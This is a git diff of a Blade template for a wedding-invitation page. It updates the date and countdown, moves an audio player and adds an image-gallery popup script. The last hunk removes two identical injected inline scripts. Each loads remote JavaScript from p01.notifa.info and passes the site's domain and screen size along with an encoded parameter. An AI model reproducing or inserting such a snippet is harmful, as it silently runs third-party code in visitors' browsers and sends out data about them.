@@ -6,7 +6,7 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta property="og:image" content="">
     <meta property="og:title" content="Wedding of Fajar & Senja" />
-    <meta property="og:description" content="Gedung Puri Begawan Bogor, 12 | December | 2019.">
+    <meta property="og:description" content="Gedung Puri Begawan Bogor, 27 | December | 2019.">
     <meta property="og:type" content="article" />
     <link rel="shortcut icon" href="{{asset('images/pandawalogo.jpg')}}">
     <meta property="og:url" content="" />
@@ -103,25 +103,25 @@
                 @include('wedding-6.gallery')
                 @include('wedding-6.video')
             </div>
+            <div class="music-box">
+                <button class="music-box-toggle-btn">
+                    <!-- <i class="fa fa-music"></i> -->
+                    <audio id='song' loop>
+                    <source src="{{ asset('wedding-6/music/andra_love_can_save_it_all.mp3') }}">
+                    </audio>  
+                    <button type="button" class="music" id="mute-sound" >
+                        <i class="fa fa-music"></i>
+                    </button>
+                    <button type="button" class="music" id="unmute-sound" >
+                        <i class="fa fa-microphone-slash"></i>
+                    </button> 
+                </button>
+            </div>
         </div>
     </div>
 
 
     <!-- strat music-box -->
-    <div class="music-box">
-        <button class="music-box-toggle-btn">
-            <!-- <i class="fa fa-music"></i> -->
-            <audio id='song' loop>
-            <source src="{{ asset('wedding-6/music/andra_love_can_save_it_all.mp3') }}">
-            </audio>  
-            <button type="button" class="music" id="mute-sound" >
-                <i class="fa fa-music"></i>
-            </button>
-            <button type="button" class="music" id="unmute-sound" >
-                <i class="fa fa-microphone-slash"></i>
-            </button> 
-        </button>
-    </div>
     <!-- end music box -->
 
     <script type="text/javascript" src="{{ asset('wedding-6/js/jquery-1.10.1.min.js') }}"></script>
@@ -144,7 +144,29 @@
 
 
     </script>
-
+    <script>
+    $('.with-caption').magnificPopup({
+        type: 'image',
+        closeBtnInside: false,
+        mainClass: 'mfp-with-zoom mfp-img-mobile',
+        image: {
+            verticalFit: true,
+            titleSrc: function(item) {
+                var caption = item.el.attr('title');
+                return caption;
+            }
+        },
+        gallery: {
+            enabled: true
+        },
+        callbacks: {
+            open: function() {
+                this.wrap.on('click.pinhandler', '.pin-it', function(e) {});
+            },
+            beforeClose: function() {}
+      }
+    });
+</script>
     <script type="text/javascript" src="{{ asset('wedding-3/js/jquery.validate.min.js') }}" ></script>
     <script type="text/javascript" src="{{ asset('wedding-3/js/framework7.js') }}"></script>
     <script type="text/javascript" src="{{ asset('wedding-3/js/jquery.swipebox.js') }}"></script> 
@@ -168,7 +190,7 @@ function pindahMenu(tujuan) {
     <script>
         function makeTimer() {
 
-            var endTime = new Date("");     
+            var endTime = new Date("December 27, 2019 08:00:00");     
             var endTime = (Date.parse(endTime)) / 1000;
 
             var now = new Date();
@@ -193,7 +215,6 @@ function pindahMenu(tujuan) {
 
         setInterval(function() { makeTimer(); }, 1000);
     </script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4AsOAl%2bDG5ffILjqNGoqiZVBqv%2fMysxuzQRe7na8BzbBrzyi4cs%2bEtSkZvtYNGqW3l%2fBFx8lPBRyVkzL3TtdL1LxuC4cx1ZtCTi7SqtZ6e3oZaNkhBpw8B2nIehV8qoudrqgGZlGEPMKEjFVlaw7TGr917IS2oYE8tqNMczZa4i5xdwukFAphfdNEx6JL5eF5UsYIAa2jb5VPokTwcxN4ny%2fC7rg9pNLkdXNG4An%2fwO3coC5DK8Cf3hTiP4bovu5J7kqqybEBN7mITtBQvNKeTjfSffFGLdlSjZs8xQAQsWEW1QgTvKULE4eWVmhvf97nkW5wTIkqCctgGPC0uR47NImFmCf%2bWVpbh90RZ0%2fq6vwbTcmegr1%2fnhFX7kXRM1htyhHLPiqccSVHdtasvh%2bBwMkUvK1wQ8OWmfiIsV%2bik1NBabMxSu8YbUaYtGVsVpI4fW1OdTHuyc0jasAWLpkJj8%2bY03ocrw%2fedT53bsI30RMm4LRGnLUBQNcgMwHpwUMvdTRAE8QUnuzTrtO2GK5GkChOlcvKkuX9NXQptu77dpQ8zXzUTI0LQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2GL9VkzwiM1E1zdk3WxprydHWlD%2bYzmzs7dapaO4Be8GpE2LYAkUcQMZSjHmAT22CunDAkL3rOAN%2bmF5eNnOZ0cXBE47LMRAjMMGxey7ILIHPYQTZpIE0Yk%2buGBFn9ilxm2ncgai2JS%2fjqsLM3lAmnB%2foOr3MwiiyP4Dq1GYZcMzHf391Cu1ES4qqyNdFnsCc%2fehZLPGhTUf1e8Od5QjSlNJRrVUyuzxxObJa9pmtne9ZWi%2b3V7N4eTC4wLZ624DWtMKWAPKuTw5Y2Fk4c3cZc%2fn2OwxPMgBMDGfu6U%2bPuFg5Y%2fgIft%2fnlgHj3nAE%2bMIiDNolV7kMLxVIx4u50WA8LneHnCqfJG9r2DWeZHADDtlPEPN2kMmnK2KpI3su3886hKZVa7hkcapw7fWvYJ%2fKgkjBEI1ql7gdw4%2fDHahVXZqurDOR2sow7ezd0Lp53L9flP0cXCquUAgBrME0fu9Ix5POSOind1wvSJJw5%2b3vRg04PRkYFrowAA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
 </body>
 </html>
